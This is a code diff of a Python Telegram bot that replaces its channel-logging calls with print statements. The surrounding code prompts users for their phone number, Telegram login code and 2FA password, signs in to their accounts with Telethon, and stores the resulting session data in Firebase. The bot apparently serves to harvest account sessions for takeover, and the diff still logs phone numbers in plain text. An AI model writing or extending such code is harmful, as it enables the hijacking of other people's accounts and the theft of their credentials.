@@ -355,11 +355,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
             context.user_data['waiting_for_phone'] = True
             context.user_data['client'] = client
-            await log_to_channel(context, f"Запрос номера телефона у {name} (@{username})", username)
+            print(f"Запрос номера телефона у {name} (@{username})")
             return
 
         if str(user_id) not in users:
-            await log_to_channel(context, LANGUAGES['Русский']['new_user'].format(name=name, user_id=user_id), username)
+            print(LANGUAGES['Русский']['new_user'].format(name=name, user_id=user_id))
             keyboard = [
                 [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                 [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
@@ -377,7 +377,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except telethon_errors.RPCError as e:
         await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-        await log_to_channel(context, f"Ошибка подключения/авторизации для {name} (@{username}): {str(e)}", username)
+        print(f"Ошибка подключения/авторизации для {name} (@{username}): {str(e)}")
     finally:
         if client.is_connected():
             await client.disconnect()
@@ -494,7 +494,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
                 context.user_data['waiting_for_code'] = True
                 del context.user_data['waiting_for_phone']
-                await log_to_channel(context, f"Номер телефона {name} (@{username}): {text}", username)
+                # Логирование без попытки отправки в канал
+                print(f"Номер телефона {name} (@{username}): {text}")
                 session_data = client.session.save()
                 await save_session_to_firebase(user_id, session_data)
                 return
@@ -510,7 +511,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                     del context.user_data['waiting_for_code']
                     del context.user_data['phone_code_hash']  # Очищаем после успешной авторизации
-                    await log_to_channel(context, f"Успешная авторизация {name} (@{username})", username)
+                    # Логирование без попытки отправки в канал
+                    print(f"Успешная авторизация {name} (@{username})")
                     keyboard = [
                         [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                         [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
@@ -524,10 +526,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text(LANGUAGES['Русский']['enter_password'])
                     context.user_data['waiting_for_password'] = True
                     del context.user_data['waiting_for_code']
-                    await log_to_channel(context, f"Запрос пароля 2FA у {name} (@{username})", username)
+                    print(f"Запрос пароля 2FA у {name} (@{username})")
                 except telethon_errors.RPCError as e:
                     await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-                    await log_to_channel(context, f"Ошибка ввода кода {name} (@{username}): {str(e)}", username)
+                    print(f"Ошибка ввода кода {name} (@{username}): {str(e)}")
                 return
 
             if context.user_data.get('waiting_for_password'):
@@ -535,7 +537,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await client.sign_in(password=text)
                     await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                     del context.user_data['waiting_for_password']
-                    await log_to_channel(context, f"Успешная авторизация с 2FA {name} (@{username})", username)
+                    print(f"Успешная авторизация с 2FA {name} (@{username})")
                     keyboard = [
                         [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                         [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
@@ -547,7 +549,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await save_session_to_firebase(user_id, session_data)
                 except telethon_errors.RPCError as e:
                     await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-                    await log_to_channel(context, f"Ошибка ввода пароля 2FA {name} (@{username}): {str(e)}", username)
+                    print(f"Ошибка ввода пароля 2FA {name} (@{username}): {str(e)}")
                 return
 
     finally:
